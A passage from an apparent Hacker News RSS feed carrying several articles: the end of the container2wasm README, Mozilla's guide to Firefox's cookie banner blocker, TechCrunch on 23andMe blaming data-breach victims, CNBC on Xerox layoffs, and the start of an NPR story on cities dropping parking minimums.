<td>‚úîÔ∏è (w/ <a href="https://github.com/ktock/container2wasm/blob/main/examples/networking/wasi">host-side network stack</a></td>
<td></td>
</tr>
<tr>
<td>wasmer</td>
<td>üöß (stdin unsupported)</td>
<td>‚úîÔ∏è</td>
<td>üöß</td>
<td>non-blocking stdin doesn't seem to work</td>
</tr>
<tr>
<td>wasmedge</td>
<td>üöß (stdin unsupported)</td>
<td>‚úîÔ∏è</td>
<td>üöß</td>
<td>non-blocking stdin doesn't seem to work</td>
</tr>
</tbody>
</table>
<h3 tabindex="-1" dir="auto">risc-v and other architecutre's containers</h3>
<table>
<thead>
<tr>
<th>runtime</th>
<th>stdio</th>
<th>mapdir</th>
<th>networking</th>
<th>note</th>
</tr>
</thead>
<tbody>
<tr>
<td>wasmtime</td>
<td>‚úîÔ∏è</td>
<td>‚úîÔ∏è</td>
<td>‚úîÔ∏è (w/ <a href="https://github.com/ktock/container2wasm/blob/main/examples/networking/wasi">host-side network stack</a>)</td>
<td></td>
</tr>
<tr>
<td>wamr(wasm-micro-runtime)</td>
<td>‚úîÔ∏è</td>
<td>‚úîÔ∏è</td>
<td>üöß</td>
<td></td>
</tr>
<tr>
<td>wazero</td>
<td>‚úîÔ∏è</td>
<td>‚úîÔ∏è</td>
<td>‚úîÔ∏è (w/ <a href="https://github.com/ktock/container2wasm/blob/main/examples/networking/wasi">host-side network stack</a>)</td>
<td></td>
</tr>
<tr>
<td>wasmer</td>
<td>üöß (stdin unsupported)</td>
<td>‚úîÔ∏è</td>
<td>üöß</td>
<td>non-blocking stdin doesn't seem to work</td>
</tr>
<tr>
<td>wasmedge</td>
<td>üöß (stdin unsupported)</td>
<td>‚úîÔ∏è</td>
<td>üöß</td>
<td>non-blocking stdin doesn't seem to work</td>
</tr>
</tbody>
</table>
<h2 tabindex="-1" dir="auto">Similar projects</h2>
<p dir="auto">There are several container runtimes support running WASM applications, but they don't run containers on WASM.</p>
<ul dir="auto">
<li>WASM on container runtimes
<ul dir="auto">
<li>Docker+Wasm integration: <a href="https://docs.docker.com/desktop/wasm/" rel="nofollow">https://docs.docker.com/desktop/wasm/</a></li>
<li>runwasi: <a href="https://github.com/containerd/runwasi">https://github.com/containerd/runwasi</a></li>
<li>youki: <a href="https://github.com/containers/youki">https://github.com/containers/youki</a></li>
<li>crun: <a href="https://github.com/containers/crun">https://github.com/containers/crun</a></li>
<li>krustlet: <a href="https://github.com/krustlet/krustlet">https://github.com/krustlet/krustlet</a></li>
</ul>
</li>
</ul>
<p dir="auto">There are emulators that support running linux on WASM, but they don't support WASI.</p>
<ul dir="auto">
<li>
<p dir="auto">x86 on WASM</p>
<ul dir="auto">
<li>v86: <a href="https://github.com/copy/v86">https://github.com/copy/v86</a></li>
</ul>
</li>
<li>
<p dir="auto">RISCV on WASM</p>
<ul dir="auto">
<li>TinyEMU: <a href="https://bellard.org/tinyemu/" rel="nofollow">https://bellard.org/tinyemu/</a></li>
</ul>
</li>
</ul>
<p dir="auto">Some WASM API specs provides applications access to the host system.
Re-compilation (and possibe re-implementation) of the application is needed.</p>
<ul dir="auto">
<li>WASI: <a href="https://github.com/WebAssembly/WASI">https://github.com/WebAssembly/WASI</a></li>
<li>WASIX(WASI + additional syscall extensions): <a href="https://github.com/wasix-org">https://github.com/wasix-org</a></li>
</ul>
<h2 tabindex="-1" dir="auto">Additional Resources</h2>
<ul dir="auto">
<li><a href="https://github.com/ktock/container2wasm/blob/main/examples"><code>./examples/</code></a>: Examples (python, php, on-browser, networking, etc.)</li>
<li><code>vscode-container-wasm</code>: VSCode extension for running containers on VSCode on browser (e.g. <code>github.dev</code>), leveraging container2wasm: <a href="https://github.com/ktock/vscode-container-wasm">https://github.com/ktock/vscode-container-wasm</a></li>
</ul>
<h2 tabindex="-1" dir="auto">Acknowledgement</h2>
<ul dir="auto">
<li>
<p dir="auto">container2wasi itself is licensed under Apache 2.0 but the generated WASM image will include third-pirty softwares:</p>
<ul dir="auto">
<li>Bochs (<a href="https://github.com/bochs-emu/Bochs/blob/master/LICENSE">GNU Lesser General Public License v2.1</a>) <a href="https://bochs.sourceforge.io/" rel="nofollow">https://bochs.sourceforge.io/</a>
<ul dir="auto">
<li>Source code is contained in (<a href="https://github.com/ktock/container2wasm/blob/main/patches/bochs"><code>./patches/bochs</code></a>). Bochs is modified by our project for making it work with containers</li>
</ul>
</li>
<li>TinyEMU (<a href="https://opensource.org/license/mit/" rel="nofollow">MIT License</a>) <a href="https://bellard.org/tinyemu/" rel="nofollow">https://bellard.org/tinyemu/</a>
<ul dir="auto">
<li>Source code is contained in (<a href="https://github.com/ktock/container2wasm/blob/main/patches/tinyemu"><code>./patches/tinyemu</code></a>). TinyEMU is modified by our project for making it work with containers</li>
</ul>
</li>
<li>GRUB (<a href="https://www.gnu.org/licenses/gpl.html" rel="nofollow">GNU General Public License Version 3</a>): <a href="https://www.gnu.org/software/grub/" rel="nofollow">https://www.gnu.org/software/grub/</a></li>
<li>BBL(riscv-pk) (<a href="https://github.com/riscv-software-src/riscv-pk/blob/master/LICENSE">license</a>): <a href="https://github.com/riscv-software-src/riscv-pk">https://github.com/riscv-software-src/riscv-pk</a></li>
<li>Linux (<a href="https://github.com/torvalds/linux/blob/master/COPYING">GNU General Public License version 2</a>): <a href="https://github.com/torvalds/linux/">https://github.com/torvalds/linux/</a></li>
<li>tini (<a href="https://github.com/krallin/tini/blob/master/LICENSE">MIT License</a>): <a href="https://github.com/krallin/tini">https://github.com/krallin/tini</a></li>
<li>runc (<a href="https://github.com/opencontainers/runc/blob/main/LICENSE">Apache License 2.0</a>): <a href="https://github.com/opencontainers/runc">https://github.com/opencontainers/runc</a></li>
<li>Binfmt (<a href="https://github.com/tonistiigi/binfmt/blob/master/LICENSE">MIT License</a>): <a href="https://github.com/tonistiigi/binfmt">https://github.com/tonistiigi/binfmt</a></li>
<li>QEMU (<a href="https://github.com/qemu/qemu/blob/master/LICENSE">license</a>): <a href="https://github.com/qemu/qemu">https://github.com/qemu/qemu</a></li>
<li>vmtouch (<a href="https://github.com/hoytech/vmtouch/blob/master/LICENSE">license</a>): <a href="https://github.com/hoytech/vmtouch">https://github.com/hoytech/vmtouch</a></li>
<li>BusyBox (<a href="https://www.busybox.net/license.html" rel="nofollow">GNU General Public License version 2</a>): <a href="https://git.busybox.net/busybox" rel="nofollow">https://git.busybox.net/busybox</a></li>
</ul>
</li>
<li>
<p dir="auto">On-browser example relies on the following softwares.</p>
<ul dir="auto">
<li>xterm-pty (<a href="https://github.com/mame/xterm-pty/blob/main/LICENSE.txt">MIT License</a>): <a href="https://github.com/mame/xterm-pty">https://github.com/mame/xterm-pty</a></li>
<li><code>browser_wasi_shim</code> (either of <a href="https://github.com/bjorn3/browser_wasi_shim/blob/main/LICENSE-MIT">MIT License</a> and <a href="https://github.com/bjorn3/browser_wasi_shim/blob/main/LICENSE-APACHE">Apache License 2.0</a>): <a href="https://github.com/bjorn3/browser_wasi_shim">https://github.com/bjorn3/browser_wasi_shim</a></li>
<li><code>gvisor-tap-vsock</code> (<a href="https://github.com/containers/gvisor-tap-vsock/blob/main/LICENSE">Apache License 2.0</a>): <a href="https://github.com/containers/gvisor-tap-vsock">https://github.com/containers/gvisor-tap-vsock</a></li>
</ul>
</li>
</ul>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Block cookie banners on Firefox (135 pts)]]></title>
            <link>https://support.mozilla.org/en-US/kb/cookie-banner-reduction</link>
            <guid>38856515</guid>
            <pubDate>Wed, 03 Jan 2024 17:07:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://support.mozilla.org/en-US/kb/cookie-banner-reduction">https://support.mozilla.org/en-US/kb/cookie-banner-reduction</a>, See on <a href="https://news.ycombinator.com/item?id=38856515">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      
      
      
      <main role="main">
      
      
  <section id="document-list">
    <header>
      <div>
          
          <p><a href="https://support.mozilla.org/en-US/products/firefox" title="Firefox">
            <img src="https://assets-prod.sumo.prod.webservices.mozgcp.net/media/uploads/products/2020-04-14-08-36-13-8dda6f.png" height="48" width="48" alt="">
          </a></p>

          
        </div>
    </header>

    <article>
      
  
  
      <section id="doc-content">
    
      <div id="toc"><h2>Table of Contents</h2><ul><li><a href="#w_why-are-cookie-banners-a-problem"><span>1</span> <span>Why are cookie banners a problem?</span></a></li><li><a href="#w_how-it-works"><span>2</span> <span>How it works</span></a></li><li><a href="#w_which-banners-are-blocked"><span>3</span> <span>Which banners are blocked?</span></a></li><li><a href="#w_get-started"><span>4</span> <span>Get started</span></a></li><li><a href="#w_customize-your-experience"><span>5</span> <span>Customize Your Experience</span></a></li><li><a href="#w_integrated-cookie-protections"><span>6</span> <span>Integrated cookie protections</span></a></li><li><a href="#w_why-germany-and-private-browsing-mode"><span>7</span> <span>Why Germany and private browsing mode?</span></a></li></ul></div>
<p>Since the development of stricter consumer privacy laws that specifically target the usage and retention of user data, such as <a href="https://wikipedia.org/wiki/General_Data_Protection_Regulation">GDPR</a>, websites have adopted legal notices to inform users that they are using technologies such as cookies to store data on the user's device. To address the increasing frustration caused by these cookie banners on websites, <a href="https://support.mozilla.org/en-US/kb/find-what-version-firefox-you-are-using">Firefox version</a> 120 introduces the cookie banner blocker. This feature is designed to make your browsing experience smoother by taking care of these annoying banners automatically. In this article, we'll show you how it works now, and how we intend to expand on it in the future.
</p>

<p>Before we dive into the solution, let's understand why cookie banners can be a hassle:
</p>
<ul><li><strong>Annoying prompts:</strong> Cookie banners, as you've likely experienced, can be quite annoying. They interrupt your browsing to ask a question that can often be confusing and irrelevant to your browsing, before allowing you to refocus on why you navigated to that site in the first place. Their goal being to create a sense of urgency, making it feel like you must choose between trading your data for access to the site, or navigating away in hopes of protecting your privacy.
</li><li><strong>Deceptive designs:</strong> Many websites employ tricky tactics when it comes to their cookie banners. They may design them in a way that makes it difficult for you to customize your settings. For example, they might make the <span>Accept All Cookies</span> button prominent, colorful and appealing, while burying the <strong>Customize Settings</strong> option in small text or a less noticeable location. This design choice can be misleading, effectively nudging users towards accepting all cookies without considering the consequences.
</li><li><strong>Prompt fatigue:</strong> The sheer volume of cookie banners that users encounter daily can lead to what we call ‚Äúprompt fatigue‚Äù. This phenomenon occurs when users are bombarded with these pop-ups so frequently that they ignore or mindlessly accept them without actually reading the contents or understanding the implications (assuming they are written in a manner that is easy to understand in the first place). Sites effectively betting that you would trade your data to save you the several seconds of your life it takes to opt out over and over again. In this environment, the websites that employ the most deceptive patterns gain an unfair advantage, as they effectively exploit this fatigue to get you to hand over your data, even when it is not needed.
</li></ul>
<h2 id="w_how-it-works">How it works</h2>
<p>When it comes to handling those cookie banners, the cookie banner blocker employs two clever methods:
</p>
<ul><li><strong>Cookie Injection:</strong> This method involves setting an ‚Äúopt-out‚Äù cookie whenever possible. Think of it like a digital note that tells the website, ‚ÄúI don't want to see this banner again.‚Äù It's a preemptive way of getting rid of those banners before they even have a chance to appear.
</li><li><strong>Auto Click CSS Selector:</strong> In cases where setting an opt-out cookie isn't an option, the Cookie Banner Blocker uses another technique. It effectively clicks on the banner's ‚Äúdecline‚Äù or ‚Äúreject‚Äù option in a way that mimics what you might do manually. This action dismisses the banner as if you made a choice yourself.
</li></ul>
<p>So, in a nutshell, the cookie banner blocker is like your automated assistant that takes care of annoying cookie banners by either preemptively telling the website you opt out or by clicking on your behalf to make them go away. This way, you can spend less time opting out and more time browsing.
</p>

<p>The cookie banner blocker works by using a careful selection of websites that we've put together. We've compiled this list by considering the most frequently visited sites in our key regions to have the broadest impact. We're actively working to expand this coverage by incorporating support for consent management platforms and other top sites we haven‚Äôt gotten to yet.
</p>
<h2 id="w_get-started">Get started</h2>
<p>The cookie banner blocker is available starting from Firefox version 120, and it's automatically enabled for users in Germany browsing in Private Browsing Mode. Here's how you can make the most of it:
</p>
<ol><li><strong>Visit supported websites:</strong> The cookie banner blocker works on websites that have a decline option in their cookie banners.
</li><li><strong>Automatic decline:</strong> When you visit a supported website, if the banner has a decline option, Firefox will automatically decline it for you.
</li><li><strong>Enjoy the benefits:</strong> You can now browse without the interruption of annoying cookie banners.
</li></ol>
<h2 id="w_customize-your-experience">Customize Your Experience</h2>
<p>If you want to enable or disable the cookie banner blocker for specific websites or altogether, here's how:
</p>
<ul><li><strong>Enable:</strong> By default, it's on in private windows for users in Germany.
</li><li><strong>Disable:</strong> You can turn it off through preferences if you wish.
</li></ul>
<h2 id="w_integrated-cookie-protections">Integrated cookie protections</h2>
<p>Firefox has additional cookie protections that work seamlessly with the cookie banner blocker:
</p>
<ul><li><strong><a href="https://support.mozilla.org/en-US/kb/introducing-total-cookie-protection-standard-mode">Total Cookie Protection (TCP)</a>:</strong> This limits the impact of tracking cookies, regardless of banner interactions.
</li><li><strong><a href="https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop">Enhanced Tracking Protection (ETP)</a> Strict Mode:</strong> Automatically blocks third-party cookies.
</li></ul>
<h2 id="w_why-germany-and-private-browsing-mode">Why Germany and private browsing mode?</h2>
<p>Our initial launch in Germany and private browsing mode has specific reasons:
</p>
<ul><li>Private browsing mode displays cookie banners repeatedly, making this feature especially useful. Germany, as a part of the European Union, is a prominent market where cookie banners are noticeable due to GDPR.
</li><li>We plan to gather insights from this launch before potentially expanding the feature to a broader audience.
</li></ul>
<p>By following these instructions, you can take full advantage of the cookie banner blocker in Firefox, simplifying your online experience while ensuring your privacy. Happy browsing!
</p>
    
  </section>

      
      
      
      
        
      
    </article>

    

    <section id="doc-contributors">
    <p>These fine people helped write this article:</p> 
  </section>

    <div>
    <p><img src="https://assets-prod.sumo.prod.webservices.mozgcp.net/static/volunteer.a3be8d331849774b.png" alt="Illustration of hands"></p><div>
      <h3>Volunteer</h3>
      <p>Grow and share your expertise with others. Answer questions and improve our knowledge base.</p>
      <p><strong><a href="https://support.mozilla.org/en-US/contribute">Learn More</a></strong></p>
    </div>
  </div>

    
      
  

    

  </section>

      </main>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[23andMe tells victims it's their fault that their data was breached (208 pts)]]></title>
            <link>https://techcrunch.com/2024/01/03/23andme-tells-victims-its-their-fault-that-their-data-was-breached/</link>
            <guid>38856412</guid>
            <pubDate>Wed, 03 Jan 2024 16:59:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://techcrunch.com/2024/01/03/23andme-tells-victims-its-their-fault-that-their-data-was-breached/">https://techcrunch.com/2024/01/03/23andme-tells-victims-its-their-fault-that-their-data-was-breached/</a>, See on <a href="https://news.ycombinator.com/item?id=38856412">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
				<p id="speakable-summary">Facing <a href="https://www.law.com/radar/card/with-data-breach-lawsuits-mounting-23andme-moves-for-california-mdl-403-96744/">more than 30 lawsuits</a> from victims of its massive data breach, 23andMe is now deflecting the blame to the victims themselves in an attempt to absolve itself from any responsibility, <a href="https://www.documentcloud.org/documents/24252535-response-letter-to-tycko-zavareei-llp">according to a letter sent to a group of victims seen by TechCrunch</a>.</p>
<p>‚ÄúRather than acknowledge its role in this data security disaster, 23andMe has apparently decided to leave its customers out to dry while downplaying the seriousness of these events,‚Äù Hassan Zavareei, one of the lawyers representing the victims who received the letter from 23andMe, told TechCrunch in an email.</p>
<p>In December, 23andMe admitted that <a href="https://techcrunch.com/2023/12/04/23andme-confirms-hackers-stole-ancestry-data-on-6-9-million-users/">hackers had stolen the genetic and ancestry data of 6.9 million users</a>, nearly half of all its customers.</p>
<p>The data breach started with hackers accessing only around 14,000 user accounts. The hackers broke into this first set of victims by <a href="https://techcrunch.com/2023/10/10/23andme-resets-user-passwords-after-genetic-data-posted-online/">brute-forcing accounts with passwords that were known to be associated with the targeted customers</a>, a technique known as credential stuffing.</p>
<p>From these 14,000 initial victims, however, the hackers were able to then access the personal data of the other 6.9 million million victims because they had opted-in to 23andMe‚Äôs <a href="https://customercare.23andme.com/hc/en-us/articles/212170838">DNA Relatives</a> feature. This optional feature allows customers to automatically share some of their data with people who are considered their relatives on the platform.</p>
<p>In other words, by hacking into only 14,000 customers‚Äô accounts, the hackers subsequently scraped personal data of another 6.9 million customers whose accounts were not directly hacked.</p>
<p>But in a letter sent to a group of hundreds of 23andMe users who are now suing the company, 23andMe said that ‚Äúusers negligently recycled and failed to update their passwords following these past security incidents, which are unrelated to 23andMe.‚Äù</p>
<p>‚ÄúTherefore, the incident was not a result of 23andMe‚Äôs alleged failure to maintain reasonable security measures,‚Äù the letter reads.</p>
<p>Zavareei said that 23andMe is ‚Äúshamelessly‚Äù blaming the victims of the data breach.</p>
<p>‚ÄúThis finger pointing is nonsensical. 23andMe knew or should have known that many consumers use recycled passwords and thus that 23andMe should have implemented some of the many safeguards available to protect against credential stuffing ‚Äî especially considering that 23andMe stores personal identifying information, health information, and genetic information on its platform,‚Äù Zavareei said in an email.</p>
<p>‚ÄúThe breach impacted millions of consumers whose data was exposed through the DNA Relatives feature on 23andMe‚Äôs platform, not because they used recycled passwords. Of those millions, only a few thousand accounts were compromised due to credential stuffing. 23andMe‚Äôs attempt to shirk responsibility by blaming its customers does nothing for these millions of consumers whose data was compromised through no fault of their own whatsoever,‚Äù said Zavareei.</p>
<div>
		<h4>Contact Us</h4><p>
		Do you have more information about the 23andMe incident? We‚Äôd love to hear from you. You can contact Lorenzo Franceschi-Bicchierai securely on Signal at +1 917 257 1382, or via Telegram, Keybase and Wire @lorenzofb, or email lorenzo@techcrunch.com. You also can contact TechCrunch via SecureDrop.	</p></div>
	
<p>In response to 23andMe‚Äôs letter, Dante Termohs, a 23andMe customer who was impacted by the data breach, told TechCrunch that he found ‚Äúit appalling that 23andMe is attempting to hide from consequences instead of helping its customers.‚Äù</p>
<p>23andMe‚Äôs lawyers argued that the stolen data cannot be used to inflict monetary damage against the victims.</p>
<p>‚ÄúThe information that was potentially accessed cannot be used for any harm. As explained in the October 6, 2023 blog post, the profile information that may have been accessed related to the DNA Relatives feature, which a customer creates and chooses to share with other users on 23andMe‚Äôs platform. Such information would only be available if plaintiffs affirmatively elected to share this information with other users via the DNA Relatives feature. Additionally, the information that the unauthorized actor potentially obtained about plaintiffs could not have been used to cause pecuniary harm (it did not include their social security number, driver‚Äôs license number, or any payment or financial information),‚Äù the letter read.</p>
<p>23andMe and one of its lawyers did not respond to TechCrunch‚Äôs request for comment.</p>
<p>After disclosing the breach, 23andMe reset all customer passwords, and then <a href="https://techcrunch.com/2023/11/07/23andme-ancestry-myheritage-two-factor-by-default/">required all customers to use multi-factor authentication</a>, which was only optional before the breach.</p>
<p>In an attempt to pre-empt the inevitable class action lawsuits and mass arbitration claims, <a href="https://techcrunch.com/2023/12/11/23andme-changes-to-terms-of-service-are-cynical-and-self-serving-lawyers-say/">23andMe changed its terms of service to make it more difficult for victims to band together</a> when filing a legal claim against the company. Lawyers with experience representing data breach victims told TechCrunch that the changes were ‚Äúcynical,‚Äù ‚Äúself-serving,‚Äù and ‚Äúa desperate attempt‚Äù to protect itself and deter customers from going after the company.</p>
<p>Clearly, the changes didn‚Äôt stop what is now a flurry of <a href="https://topclassactions.com/lawsuit-settlements/privacy/data-breach/23andme-hit-with-another-class-action-lawsuit-over-data-breach/">class action lawsuits</a>.</p>
			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Xerox to cut 15% of its workforce (109 pts)]]></title>
            <link>https://www.cnbc.com/2024/01/03/xerox-layoffs-company-to-cut-15percent-of-workforce.html</link>
            <guid>38855621</guid>
            <pubDate>Wed, 03 Jan 2024 16:05:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cnbc.com/2024/01/03/xerox-layoffs-company-to-cut-15percent-of-workforce.html">https://www.cnbc.com/2024/01/03/xerox-layoffs-company-to-cut-15percent-of-workforce.html</a>, See on <a href="https://news.ycombinator.com/item?id=38855621">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="RegularArticle-ArticleBody-6" data-module="ArticleBody" data-test="articleBody-2" data-analytics="RegularArticle-articleBody-6-2"><div id="ArticleBody-InlineImage-106258696" data-test="InlineImage"><p>Signage is displayed outside the Xerox headquarters in Norwalk, Connecticut.</p><p>Michael Nagle | Bloomberg | Getty Images</p></div><div><p><span data-test="QuoteInBody" id="RegularArticle-QuoteInBody-1"><a href="https://www.cnbc.com/quotes/XRX/">Xerox</a><span><span id="-WatchlistDropdown" data-analytics-id="-WatchlistDropdown"></span></span></span> on Wednesday announced it will cut 15% of its workforce as part of a plan to implement a new organizational structure and operating model.</p><p>Xerox, which offers digital printing and document management technologies, had about 20,500 employees as of Dec. 31, 2022, according to a filing with the U.S. Securities and Exchange Commission. Based on this figure, Wednesday's layoffs will affect about 3,075 employees.</p><p>Shares of Xerox fell more than 9% following the announcement Wednesday.</p><p>The company's restructuring plan involves simplifying its products within its core print business, increasing efficiency across its global business services and boosting focus on IT and other digital services, according to <a href="https://www.news.xerox.com/news/xerox-reinvention-and-operating-model-evolution" target="_blank">a release</a>. Xerox said it also redesigned its executive team to help carry out the new model.</p><p><em>"</em>The shift to a business unit operating model is a continuation of our client-focused, balanced execution priorities and is designed to accelerate product and services, go-to-market, and corporate functions' operating efficiencies across all geographies we serve," Xerox CEO Steven Bandrowczak said in the release.</p><p>Xerox will carry out the cuts this quarter, according to the release. A representative for Xerox did not comment beyond the release.<br><em><strong><br>Don't miss these stories from CNBC PRO:</strong></em></p><ul><li><a href="https://www.cnbc.com/2024/01/01/these-stocks-will-be-the-biggest-sp-500-winners-of-2024-according-to-analysts.html"><em>These stocks will be the biggest S&amp;P 500 winners of 2024, according to analysts</em></a></li><li><a href="https://www.cnbc.com/2024/01/01/heres-where-to-invest-50000-in-the-new-year-according-to-the-pros.html"><em>Here's where to invest $50,000 in the new year, according to the pros</em></a></li><li><a href="https://www.cnbc.com/2023/12/28/could-a-bitcoin-etf-approval-be-a-sell-the-news-event-what-investors-are-expecting-on-the-big-day.html"><em>Could a bitcoin ETF approval be a sell-the-news event? Here's what to expect if it happens</em></a></li><li><a href="https://www.cnbc.com/2023/12/29/these-stocks-will-be-the-biggest-dow-winners-of-2024-according-to-analysts.html"><em>These stocks will be the biggest Dow winners of 2024, according to analysts</em></a></li><li><a href="https://www.cnbc.com/2023/12/25/oprahs-flip-on-weight-loss-drugs-is-a-sign-of-whats-to-come-for-the-ozempic-trade-in-2024.html"><em>Oprah's flip on weight loss drugs is a sign of what's to come for the 'Ozempic trade' in 2024</em></a></li></ul></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[U.S. cities opt to ditch their off-street parking minimums (146 pts)]]></title>
            <link>https://www.npr.org/2024/01/02/1221366173/u-s-cities-drop-parking-space-minimums-development</link>
            <guid>38855427</guid>
            <pubDate>Wed, 03 Jan 2024 15:49:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.npr.org/2024/01/02/1221366173/u-s-cities-drop-parking-space-minimums-development">https://www.npr.org/2024/01/02/1221366173/u-s-cities-drop-parking-space-minimums-development</a>, See on <a href="https://news.ycombinator.com/item?id=38855427">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="storytext">
      <div id="res1221480452">
            <div data-crop-type="">
        <picture>
            <source srcset="https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s400-c85.webp 400w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s600-c85.webp 600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s800-c85.webp 800w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s900-c85.webp 900w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1200-c85.webp 1200w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1600-c85.webp 1600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1800-c85.webp 1800w" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/webp">
            <source srcset="https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s400-c85.jpg 400w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s600-c85.jpg 600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s800-c85.jpg 800w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s900-c85.jpg 900w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1200-c85.jpg 1200w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1600-c85.jpg 1600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1800-c85.jpg 1800w" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/jpeg">
            <img src="https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1100-c50.jpg" alt="" loading="lazy">
        </picture>
        
</div>
<div>
    <div>
        <p>
                Austin, Texas, is the country's largest city to toss out its requirements for off-street car parking. The city hopes removing the mandates will encourage other modes of transportation and help housing affordability.
                <b aria-label="Image credit">
                    
                    Brandon Bell/Getty Images
                    
                </b>
                <b><b>hide caption</b></b>
            </p>


            <p><b><b>toggle caption</b></b>
    </p></div>

    <p><span aria-label="Image credit">
        
        Brandon Bell/Getty Images
        
    </span>
</p></div>
<div>
        <picture>
            <source data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1200.webp" type="image/webp">
            <source data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1200.jpg" type="image/jpeg">
            <img data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1200.jpg" alt="" src="https://media.npr.org/assets/img/2023/12/24/gettyimages-1726577195-581e59f935ec92d92b168a73392797527a65a920-s1200.jpg">
        </picture>
    </div>
<div>
        <p>Austin, Texas, is the country's largest city to toss out its requirements for off-street car parking. The city hopes removing the mandates will encourage other modes of transportation and help housing affordability.</p>
        <p><span aria-label="Image credit">
            
            Brandon Bell/Getty Images
            
        </span>
    </p></div>
   </div>
   <p>The city council in Austin, Texas recently proposed something that could seem like political Kryptonite: getting rid of parking minimums.</p>   <p>Those are the rules that dictate how much off-street parking developers must provide ‚Äî as in, a certain number of spaces for every apartment and business.</p>   <p>Around the country, cities are throwing out their own <a href="https://www.npr.org/2023/05/09/1175035781/how-parking-explains-everything">parking requirements</a> ‚Äì hoping to end up with less parking, more affordable housing, better transit, and walkable neighborhoods.</p>   <p>Some Austinites were against tossing the rules.</p>   <p>"Austin has developed as a low density city without adequate mass transportation system," said resident Malcolm Yeatts. "Austin citizens cannot give up their cars. Eliminating adequate parking for residents will only increase the flight of the middle class and businesses to the suburbs."</p>   
   
   
<!-- END ID="RES1221846111" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>But much more numerous were voices in support of eliminating the minimums and the impact they've had on housing costs, congestion, and walkability.</p>   <p>"I think our country has used its land wastefully, like a drunk lottery winner that's squandered their newfound wealth," said resident Tai Hovanky. "We literally <a href="https://jonimitchell.com/music/song.cfm?id=13">paved paradise and put up a parking lot</a>."</p>   <p>The amendment <a href="https://www.kut.org/austin/2023-11-02/austin-becomes-one-of-the-largest-cities-in-the-country-to-get-rid-of-parking-requirements">sailed through the council</a> ‚Äî making Austin the biggest city in the country to eliminate its parking mandates citywide. </p>   <h3>Dozens of cities have ditched parking minimums</h3>   <p>But it's not just Austin. More than 50 other cities and towns have thrown out their minimums, from <a href="https://www.muni.org/Departments/Assembly/PressReleases/Pages/Parking-Minimum-Ordinance.aspx#:~:text=At%20the%20November%2022%20Assembly,Volland%2C%20Kevin%20Cross%20and%20Forrest">Anchorage, Alaska</a><strong>,</strong> and <a href="https://www.sanjoseca.gov/your-government/departments-offices/planning-building-code-enforcement/planning-division/ordinances-proposed-updates/parking-policy-evaluation#:~:text=Ordinances%20%26%20Proposed%20Updates-,Parking%20and%20Transportation%20Demand%20Management%20(TDM)%20Ordinance%20Update,favor%20other%20modes%20of%20transportation.">San Jose, Calif.</a>, to <a href="https://warrington.ufl.edu/due-diligence/2023/07/17/parking-puzzle/">Gainesville, Fla.</a> </p>   <p>"They're all just dead weight," says Tony Jordan, the president of the <a href="https://parkingreform.org/">Parking Reform Network</a>, of parking minimums. One issue is just how arbitrary they can be.</p>   <p>Take bowling alleys.<strong> </strong>Jordan says the number of required parking spots per bowling lane could vary anywhere from two to five, in cities right next to each other.</p>   <p>"What's the difference between a bowler in city A and city B? Nothing. It's just these codes were put in ... very arbitrarily back 30 or 40 years ago and they're very hard to change because anytime the city wants to change them, there's a whole big hoopla," he says.</p>   <div id="res1221480225">
            <div data-crop-type="">
        <picture>
            <source srcset="https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s400-c85.webp 400w,
